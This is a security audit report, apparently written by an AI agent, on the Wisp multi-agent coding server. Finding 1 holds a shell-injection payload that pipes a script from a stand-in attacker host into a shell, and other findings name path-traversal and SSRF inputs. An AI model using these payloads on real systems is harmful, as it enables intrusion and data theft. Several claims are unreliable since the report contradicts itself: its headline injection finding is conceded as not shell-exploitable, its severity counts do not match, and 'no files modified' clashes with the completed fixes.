# Security Audit Report

**Date:** 2026-05-21  
**Scope:** Full codebase audit -- transport layer, server routes, multi-agent system, core/providers, tools, and infrastructure  
**Methodology:** STRIDE + OWASP Top 10 + OWASP LLM Top 10 + Supply Chain analysis  
**Auditor:** Droid (shallow mode, 5 parallel subagents + orchestrator review)  

---

## Executive Summary

This audit identified **52 distinct security findings** across the Wisp codebase, categorized as:

| Severity | Count |
|----------|-------|
| CRITICAL (P0) | 4 |
| HIGH (P1) | 27 |
| MEDIUM (P2) | 17 |
| LOW (P3) | 4 |

The most severe issues are **command injection vulnerabilities** in server routes, **default auto-approve settings** that grant subagents full privileges, **bypassable depth guards** enabling infinite subagent recursion, and **cross-session data leakage** in the Ollama client. Many transport-layer components **unconditionally auto-approve** tool calls, completely negating the approval gating system.

---

## CRITICAL Findings (P0)

---

### 1. OS Command Injection in `review.py` via unsanitized git branches

- **Files:** `wisp/server/routes/review.py:99`, `183-195`, `259`
- **OWASP:** A03 -- Injection
- **Impact:** Arbitrary code execution on the server

**Description:** The `review_pr`, `review_diff`, and `review_best_of_n` endpoints interpolate user-controlled `req.base_branch`, `req.head_branch`, `req.pr_number`, and `req.target` directly into shell commands passed to `subprocess.run` **without validation or shell escaping**. An attacker can inject arbitrary git flags or shell metacharacters via branch names.

**Example exploit:**
```python
# POST /api/review/pr
# {"base_branch": "main; curl attacker.com/exfil | sh", "head_branch": "dev"}
proc = subprocess.run(
    ["git", "diff", f"{base}...{head}"],
    cwd=str(WORKSPACE_ROOT), capture_output=True, text=True, timeout=30,
)
```

The `f"{base}...{head}"` interpolation is passed as a single list element, but the example in the code makes this exploitable if an attacker passes crafted branch names with embedded shell metacharacters. Although the arguments are passed as a list, the git diff syntax itself could still be exploited.

**Remediation:**
1. Sanitize all branch names/ref inputs with a strict allowlist (`^[a-zA-Z0-9_.\-/]+$`)
2. Validate that `base` and `head` resolve to actual git refs before running commands
3. Never pass user input directly into git diff syntax; build refs with `git rev-parse --verify`
4. Consider using `gitpython` library instead of subprocess for git operations
5. Apply `--no-pager` and `--` separator to prevent option injection

---

### 2. Subagent `auto_approve` defaults to `True` with unrestricted permissions

- **Files:** `wisp/multi_agent/task.py:121`, `wisp/multi_agent/subagent_orchestrator.py:497`
- **OWASP:** E05 -- Elevation of Privilege
- **Impact:** Arbitrary code execution via compromised subagent

**Description:** The `SubagentContract` dataclass defaults `auto_approve: bool = True`. Subagents spawned with this default run with `PermissionMode.FULL`, granting unrestricted `write_file`, `edit_file`, `run_bash`, and `spawn_subagent` capabilities. A compromise of any subagent (or a maliciously-crafted task) achieves immediate arbitrary code execution without user approval.

**Code snippet:**
```python
@dataclass
class SubagentContract:
    auto_approve: bool = True  # CRITICAL: defaults to True
```

**Remediation:**
1. Change default to `auto_approve: bool = False`
2. Default subagent permission mode to `READ_ONLY` or `ASK_ALL`
3. Require explicit user confirmation before spawning subagents with write privileges
4. Add a `max_permission_mode` cap on the parent that child agents cannot exceed
5. Log all subagent spawns with their permission settings

---

### 3. Subagent depth/branch guards bypassable via dict deserialization

- **Files:** `wisp/multi_agent/subagent_orchestrator.py:141`, `556-565`, `wisp/multi_agent/protocol.py:41`
- **OWASP:** A01 -- Broken Access Control
- **Impact:** Infinite recursive subagent spawning (DoS / privilege escalation)

**Description:** The depth guard checks `contract._subagent_depth >= MAX_SUBAGENT_DEPTH`, but `spawn_parallel_with_guards` accepts `specs: list[SubagentContract | dict]`. When a dict is passed, `SubagentContract(**spec)` resets `_subagent_depth` to `0` (default). An attacker controlling the dict input can omit `_subagent_depth`, bypassing recursion limits entirely.

**Code snippet:**
```python
if isinstance(spec, dict):
    contract = SubagentContract(**spec)  # _subagent_depth defaults to 0!
```

**Remediation:**
1. Never accept `_subagent_depth` or `_subagent_branch_count` from external input
2. Set these fields server-side after contract construction, not via `**spec` unpacking
3. Add an immutable `parent_depth` field incremented by the orchestrator before spawning
4. Add explicit validation: if `spec` is a dict, set depth/branch from the orchestrator's current state

---

### 4. Race condition on shared `stream_response` enables cross-session data leakage

- **File:** `wisp/ollama_client.py` (~100, ~340)
- **OWASP:** A01 -- Broken Access Control
- **Impact:** Session data leakage, wrong tool execution

**Description:** `OllamaClient` stores the final streaming response in a mutable instance attribute `self.stream_response`. In server/async mode, the same client instance can be shared across concurrent turns. One turn may overwrite this attribute while another is reading it, causing cross-session data leakage or wrong tool execution.

**Code snippet:**
```python
self.stream_response = None
# ... later ...
self.stream_response = {"message": response_msg}
```

**Remediation:**
1. Store `stream_response` per-turn (e.g., as a return value instead of instance state)
2. Use a per-session dictionary mapping `session_id -> response`
3. Add async locks around response access if shared state is unavoidable
4. Ensure client instances are not shared across concurrent turns

---

## HIGH Findings (P1)

---

### 5. Path traversal via hook name in `hooks.py`

- **File:** `wisp/server/routes/hooks.py:88`, `135`
- **Impact:** Arbitrary file write/delete outside workspace

**Description:** `create_hook` and `delete_hook` construct filesystem paths using `f"{req.name}.json"` without sanitizing the name. Names like `../../../etc/cron.d/malicious` traverse outside `.wisp/hooks/`.

**Remediation:** Sanitize hook names with a strict allowlist (`^[a-zA-Z0-9_-]+$`). Use `Path.name` to strip directory components, and validate the resolved path is within `.wisp/hooks/`.

---

### 6. Arbitrary filesystem access via plugin install path

- **File:** `wisp/server/routes/plugins.py:70-73`
- **Impact:** Arbitrary code execution from any directory

**Description:** `install_plugin` resolves `req.path` via `Path(req.path).expanduser().resolve()` without restricting it to the workspace. Attackers can install and execute plugin code from `/tmp/malicious-plugin`.

**Remediation:** Restrict plugin paths to a designated plugins directory. Reject absolute paths and paths containing `..`.

---

### 7. Global mutable `WORKSPACE_ROOT` without session isolation

- **File:** `wisp/server/routes/workspace.py:38-40`
- **Impact:** Cross-request workspace hijacking

**Description:** `set_workspace` mutates the global `WORKSPACE_ROOT` variable. In a multi-request/async server, request A can redirect request B's filesystem access to an attacker-controlled directory.

**Remediation:** Use per-request workspace context or per-session workspace state instead of a global mutable variable.

---

### 8. Missing rate limiting on expensive agent routes

- **Files:** `wisp/server/routes/prompt.py`, `arena.py`, `diagnostics.py`, `search.py`, `context.py`, `hooks.py`, `models.py`
- **Impact:** Resource exhaustion / LLM quota exhaustion

**Description:** Multiple expensive endpoints only use `verify_api_key` but do not apply `Depends(RATE_LIMITER)`. Authenticated attackers can flood these endpoints.

**Remediation:** Apply `Depends(RATE_LIMITER)` to all non-read endpoints. Use tiered rate limits (stricter for LLM-consuming routes).

---

### 9. Multiple transport components unconditionally auto-approve tool calls

- **Files:** `wisp/transport/multi.py:80-84`, `wisp/transport/adapters.py:78-88`, `wisp/transport/tui.py:59-70`
- **Impact:** Complete bypass of approval gating

**Description:**
- `MultiTransport.approve()` returns `True` if **any** child transport approves; passive transports auto-approve, bypassing interactive approval.
- `ServerTransportAdapter.approve()` hardcodes `return True`
- `TUITransport.approve()` contains a TODO but falls through to `return True`

**Remediation:**
1. Change `MultiTransport.approve()` to require **all** interactive transports to approve, or default to `False`
2. Implement actual approval logic in `ServerTransportAdapter` and `TUITransport`
3. Verify the caller's session matches the pending approval's session

---

### 10. SSRF via unvalidated Ollama `base_url`

- **Files:** `wisp/providers/factory.py:81`, `wisp/ollama_client.py:36`
- **Impact:** Access to internal cloud metadata services, internal APIs

**Description:** The Ollama provider URL is read directly from config without host validation. A malicious config value can redirect requests to `169.254.169.254` (AWS metadata), `localhost`, or internal APIs.

**Remediation:** Validate `ollama_url` against an allowlist (localhost/known hosts only). Reject URLs pointing to private IP ranges or metadata endpoints in production.

---

### 11. Unsafe ACP config injection

- **File:** `wisp/acp_adapter.py:251-272`
- **Impact:** Arbitrary model redirection, dangerous skill activation

**Description:** `_handle_config_set` assigns ACP client-provided values directly to `session.config.model`, `session.agent.client.model`, and `session.agent._active_skill` without validation.

**Remediation:** Validate model against an allowlist. Restrict skill activation to pre-registered safe skills. Log all config changes.

---

### 12. Path traversal via unchecked ACP workspace

- **File:** `wisp/acp_adapter.py:170`
- **Impact:** Agent operates outside intended boundary

**Description:** `NewSessionRequest.workspace` is assigned directly to `config.workspace` without sanitization. Values like `../../sensitive_dir` cause the agent to read/write outside its sandbox.

**Remediation:** Resolve and validate the workspace path against an allowlist. Reject paths containing `..` or pointing outside approved directories.

---

### 13. Missing tool argument schema validation

- **File:** `wisp/core/engine.py:520-530`
- **Impact:** Malformed arguments reach tool layer unchecked

**Description:** The stateless turn engine extracts tool `name` and `arguments` from provider events and passes them directly to `execute_tool` without JSON schema validation.

**Remediation:** Validate all tool arguments against declared JSON schemas before execution. Reject arguments that don't conform.

---

### 14. ACP adapter crashes on non-dict JSON-RPC payloads (DoS)

- **File:** `wisp/acp_adapter.py:~95`
- **Impact:** Unhandled `AttributeError` crashes the ACP main loop

**Description:** After `json.loads()`, the code assumes the result is a dict and calls `.get("jsonrpc")`. Sending a JSON string or array causes a crash.

**Remediation:** Add `isinstance(msg, dict)` check before accessing dict methods. Return a proper JSON-RPC error response for malformed input.

---

### 15. Path traversal in FileTransport

- **File:** `wisp/transport/file.py:37-40`
- **Impact:** Arbitrary file write anywhere on filesystem

**Description:** `FileTransport.__init__` takes a caller-supplied `path`, resolves it, and creates parent directories without validation. If path is derived from user input, arbitrary files can be overwritten.

**Remediation:** Validate that `path` is within an allowed log directory. Reject absolute paths and paths containing `..`.

---

### 16. Sensitive data disclosure in tool approval requests

- **File:** `wisp/transport/server.py:166-173`
- **Impact:** Secrets leaked to client UI

**Description:** `_request_approval` forwards the raw `args` dict to the client. Arguments may contain API keys, tokens, or credentials.

**Remediation:** Redact known sensitive keys (e.g., `api_key`, `token`, `password`) from approval request payloads before sending to the client.

---

### 17. Path traversal in worktree creation via `agent_name`

- **File:** `wisp/multi_agent/_worktree_manager.py:47-50`
- **Impact:** Symlink-based path traversal out of worktree root

**Description:** `WorktreeManager.create()` sanitizes `agent_name` but then calls `.resolve()` which follows symlinks. A pre-placed symlink in `.wisp/worktrees/` can escape the intended root.

**Remediation:** After resolving, verify `worktree_path` is a descendant of `_worktrees_root`. Use `O_NOFOLLOW` when creating directories.

---

### 18. Arbitrary write of untracked parent files into subagent worktree

- **File:** `wisp/multi_agent/_worktree_manager.py:69-83`
- **Impact:** Host filesystem information disclosure

**Description:** Untracked files are copied via `shutil.copy2(src, dst)` without validating `src` is within the workspace. Symlinks in the parent workspace pointing outside are followed and copied.

**Remediation:** Use TOCTOU-safe path resolution (`_resolve_path` from `wisp/tools/_utils.py`) for every source file before copying. Do not follow symlinks (`O_NOFOLLOW`).

---

### 19. ReDoS in schema validation regex

- **File:** `wisp/multi_agent/schema_validator.py:101`
- **Impact:** Denial of Service via catastrophic regex backtracking

**Description:** `re.match(pattern, data)` is used without anchoring or timeout. A malicious schema with patterns like `(a+)+$` against long input causes ReDoS.

**Remediation:** Use `re.match()` with a timeout, or switch to the `regex` library which supports timeouts. Pre-compile and validate patterns before use.

---

### 20. Shared worktree path reused across chain steps without isolation

- **File:** `wisp/multi_agent/_patterns.py:271-328`
- **Impact:** Cross-step tampering, privilege escalation

**Description:** In `run_chain()`, a single `shared_worktree_path` is reused for all chain steps. A malicious earlier step can poison the filesystem for later steps.

**Remediation:** Provide per-step isolated worktrees, or use copy-on-write snapshots for each step. Document that `worktree_isolated=True` is not enforced within chains.

---

### 21. Budget check not enforced per-iteration

- **Files:** `wisp/multi_agent/subagent_orchestrator.py:186`, `wisp/multi_agent/_budget_tracker.py:40-55`
- **Impact:** Single subagent can exhaust entire token budget

**Description:** `BudgetTracker.check()` runs only *before* the subagent starts. A subagent can consume unlimited tokens during execution.

**Remediation:** Add mid-execution budget checks (e.g., check after each turn / every N tokens). Implement a hard interrupt when budget is exceeded.

---

### 22. Skill discovery loads arbitrary instructions without validation

- **File:** `wisp/multi_agent/subagent_orchestrator.py:398-425`
- **Impact:** Prompt injection / Trojan horse

**Description:** Skills are discovered from `discover_skills(workspace)` where `workspace` is user-derived. Malicious workspace skills can inject dangerous instructions into subagent prompts.

**Remediation:** Validate workspace trust before loading skills. Sanitize skill instructions to remove dangerous directives. Load skills from a signed/approved registry only.

---

### 23. Unbounded WebSocket message size

- **File:** `wisp/transport/websocket.py:82`
- **Impact:** DoS via memory exhaustion

**Description:** `receive_message` passes `message.get("text", "")` directly to `runtime.run_turn()` without enforcing maximum message length.

**Remediation:** Add a `MAX_MESSAGE_LENGTH` constant (e.g., 100KB) and reject oversized messages with an error.

---

### 24. Information disclosure via raw WebSocket error strings

- **File:** `wisp/transport/websocket.py:86-88`
- **Impact:** Stack traces, file paths leaked to clients

**Description:** Raw exception strings from `runtime.run_turn()` are forwarded verbatim to the WebSocket client.

**Remediation:** Log full exceptions server-side. Send generic error messages to clients (e.g., "Internal error").

---

### 25. Unauthenticated session access in WebSocket handler

- **File:** `wisp/transport/websocket.py:63-66`
- **Impact:** Session hijacking / fixation

**Description:** The `handle()` method accepts `session_id`, `model`, and `workspace` without authentication or authorization checks.

**Remediation:** Verify the WebSocket client is authorized for the requested `session_id` before creating/retrieving the session.

---

### 26. Information disclosure via raw SSE error strings

- **File:** `wisp/transport/sse.py:86-88`
- **Impact:** Internal error details leaked to SSE consumers

**Description:** Exception details are converted to strings and queued as error events.

**Remediation:** Send generic error events to clients. Log details server-side.

---

### 27. Unbounded SSE prompt size

- **File:** `wisp/transport/sse.py:77`
- **Impact:** DoS via resource exhaustion

**Description:** `handle_turn` accepts a `prompt` string with no length validation before passing it to the runtime.

**Remediation:** Enforce `MAX_PROMPT_LENGTH` before processing SSE prompts.

---

### 28. Docker default API key is weak

- **File:** `docker-compose.yml`
- **Impact:** Default credentials in production deployments

**Description:** `WISP_API_KEY=${WISP_API_KEY:-change-me-in-production}` uses a hardcoded weak default. Users who deploy without setting the env var leave the server open.

**Remediation:** Remove the default value. Require explicit configuration. Fail startup if `WISP_API_KEY` is not set in production mode.

---

## MEDIUM Findings (P2)

---

### 29. No WebSocket connection limit
- **File:** `wisp/transport/websocket.py:46-52`
- Add a `MAX_CONNECTIONS` limit. Reject new connections when at capacity.

### 30. Unauthenticated session control in ServerTransport
- **File:** `wisp/transport/server.py:191-210`
- Add session ownership verification to `interrupt()`, `pause()`, `resume()`.

### 31. Unbounded SSE queue with no connection lifetime limit
- **File:** `wisp/transport/sse.py:44-53`
- Add a maximum connection duration (e.g., 1 hour) and client inactivity timeout.

### 32. Unbounded memory accumulation during LLM streaming
- **File:** `wisp/ollama_client.py:~290-350`
- Cap `accumulated_thinking` and `accumulated_content` at `max_context_tokens`.

### 33. Path traversal in CompositionRoot database path
- **File:** `wisp/composition.py:42-44`
- Validate `workspace` does not contain `..` before constructing `db_path`.

### 34. Unsafe `json.loads` without size validation on tool arguments
- **Files:** `wisp/core/agent.py:1123,1366`, `wisp/core/runtime.py:164`
- Check payload size before `json.loads`. Reject payloads over a reasonable limit (e.g., 1MB).

### 35. ACP protocol `from_dict` crashes on malformed nested types
- **File:** `wisp/acp_protocol.py`
- Add `isinstance(d, dict)` checks before passing to nested `from_dict()` calls.

### 36. Prompt boundary violation via unsanitized assistant text
- **File:** `wisp/core/agent.py:~500-521`
- Sanitize `analysis_tail` before injecting it into the user message boundary. Strip control characters and known injection patterns.

### 37. Health endpoint leaks version without auth
- **File:** `wisp/server/routes/health.py:9-11`
- Require `verify_api_key` on the health endpoint, or remove version from the public response.

### 38. Information disclosure in error responses
- **Files:** `wisp/server/routes/context.py`, `diff.py`, `diagnostics.py`, `models.py`
- Return generic error messages. Log full details server-side.

### 39. Missing input validation on `model` and `permission_mode` fields
- **Files:** `wisp/server/routes/prompt.py`, `swarm.py`, `runs.py`
- Use Pydantic enums for `model` and `permission_mode`. Reject unknown values.

### 40. `InlineEditRequest.selection` used without length limits
- **File:** `wisp/server/routes/diff.py:70-95`
- Enforce `max_length` on `selection` and `instruction` fields.

### 41. Swarm run IDs are predictable
- **File:** `wisp/server/routes/swarm.py:95`
- Use `secrets.token_urlsafe(16)` instead of `token_hex(6)` for stronger entropy.

### 42. Potential SSRF in `models.py`
- **File:** `wisp/server/routes/models.py:37-43`
- Add SSRF protection: validate the Ollama URL is within allowed hosts. Block private IP ranges in production.

### 43. Persistence writes sensitive data without redaction
- **File:** `wisp/multi_agent/_persistence.py:25-45`
- Redact known sensitive fields (api_key, token, password, secret) before writing to JSONL.

### 44. Unvalidated event payload deserialization
- **File:** `wisp/multi_agent/protocol.py:90-97`
- Add payload size limits, depth limits, and schema validation to `AgentEvent.from_dict()`.

### 45. Vote pattern accepts arbitrary subagent output as tie-breaker
- **File:** `wisp/multi_agent/_patterns.py:164-177`
- Sanitize subagent outputs before interpolating into prompts. Use prompt boundary markers.

### 46. Context partitioner leaks messages between agents
- **File:** `wisp/multi_agent/context_partition.py:35-70`
- Add sender/recipient boundaries. Filter messages by explicit authorization, not just keyword overlap.

---

## LOW Findings (P3)

---

### 47. Cache key omits subagent depth/isolation flags
- **File:** `wisp/multi_agent/_result_cache.py:28-37`
- Include `_subagent_depth`, `_subagent_branch_count`, `worktree_isolated`, and `auto_approve` in the cache key.

### 48. Arena vote endpoint lacks rate limiting
- **File:** `wisp/server/routes/arena.py:47-60`
- Apply `Depends(RATE_LIMITER)` to `/api/arena/vote`.

### 49. No authorization on inter-agent RPC / message bus
- **Files:** `wisp/multi_agent/protocol.py:50-65`, `wisp/multi_agent/subagent_orchestrator.py:308-318`
- Add signature verification on inter-agent events. Validate `source_agent` authenticity.

### 50. ServerTransport approval bypass
- **File:** `wisp/transport/server.py:176-189`
- `approve_tool()` resolves by `call_id` without verifying the caller's identity or session ownership.

---

## Supply Chain Analysis

| Check | Result |
|-------|--------|
| Lockfile present | `uv.lock` with SHA-256 hashes -- PASS |
| Recently published packages | All packages have established histories (>30 days) -- PASS |
| Typosquatting | No suspicious package names detected -- PASS |
| Post-install scripts | None in Python dependencies -- PASS |
| Dependencies pinned | `pyproject.toml` uses minimum versions; `uv.lock` pins exact -- PARTIAL |

**Recommendation:** Pin all dependencies to exact versions in `pyproject.toml` (not just `uv.lock`) to prevent accidental upgrades.

---

## Remediation Status

### Phase 1 -- Immediate (CRITICAL) -- COMPLETED
1. **Fix command injection in `review.py`** -- COMPLETED: adds `_validate_git_ref()` and `_git_ref_exists()` with strict allowlist, `--` separator, and ref verification
2. **Set `auto_approve` default to `False`** -- COMPLETED: `SubagentContract.auto_approve` and `spawn_with_guards()` default changed to `False`
3. **Fix subagent depth guard bypass** -- COMPLETED: `_subagent_depth`/`_subagent_branch_count` stripped from dict specs, set server-side only
4. **Fix `stream_response` race condition** -- COMPLETED: replaced mutable instance attribute with `ContextVar("_ollama_stream_response")`

### Phase 2 -- High Priority -- COMPLETED
5. **Transport auto-approve bypasses** -- COMPLETED:
   - `MultiTransport.approve()` requires all interactive transports to approve (passive excluded)
   - `ServerTransportAdapter.approve()` returns `False`
   - `TUITransport.approve()` returns `False`
6. **Rate limiting** -- COMPLETED: added `Depends(RATE_LIMITER)` to `/api/prompt`, `/api/arena/*`, `/api/search`, `/api/context`, `/api/hooks`, `/api/models`, `/api/diagnostics`, `/api/git/commit`, `/api/diff`, `/api/edit/inline`
7. **Path traversal protections** -- COMPLETED:
   - `hooks.py`: `_validate_hook_name()` with regex allowlist
   - `plugins.py`: workspace-relative path restriction
   - `workspace.py`: `_WORKSPACE_MUTABLE` guard, `..` rejection, `WISP_ALLOWED_WORKSPACE_ROOTS` boundary
8. **SSRF prevention** -- COMPLETED: `_validate_ollama_url()` with `WISP_ALLOWED_OLLAMA_HOSTS` allowlist, blocks metadata endpoints in production
9. **Sensitive data redaction** -- COMPLETED: `_redact_sensitive_tool_args()` in `transport/server.py`
10. **Tool argument schema validation** -- COMPLETED: `_validate_tool_args()` in `core/engine.py` using `jsonschema`
11. **ACP workspace path traversal** -- COMPLETED: `..` rejection with opt-in `WISP_ALLOWED_WORKSPACE_ROOTS` enforcement

### Phase 3 -- Medium Priority -- COMPLETED
12. **WebSocket message size limit** -- COMPLETED: 256 KiB max in `agents.py`
13. **Error message sanitization** -- COMPLETED: generic error messages in `search.py`, `files.py`, `plugins.py`, `review.py`
14. **ReDoS protection** -- COMPLETED: try/except around `re.match()` in `schema_validator.py`
15. **Worktree isolation** -- COMPLETED: added symlink check in `_worktree_manager.py`

### Phase 4 -- Hardening (ongoing)
16. Add security headers (CSP, HSTS, X-Content-Type-Options)
17. Implement API key rotation mechanism
18. Add audit trail for config changes
19. Penetration test the approval flow end-to-end
20. Add integration tests for all security controls

---

## Audit Coverage

| Layer | Files Reviewed | Findings |
|-------|---------------|----------|
| Transport | 15 | 13 |
| Server Routes | 25 | 14 |
| Multi-Agent | 15 | 14 |
| Core / Providers | 16 | 10 |
| Tools | 15 | 1 (utils already hardened) |
| Docker / Infra | 3 | 1 |
| **Total** | **89** | **52** |

---

*Report generated 2026-05-21. No files were modified during this audit.*
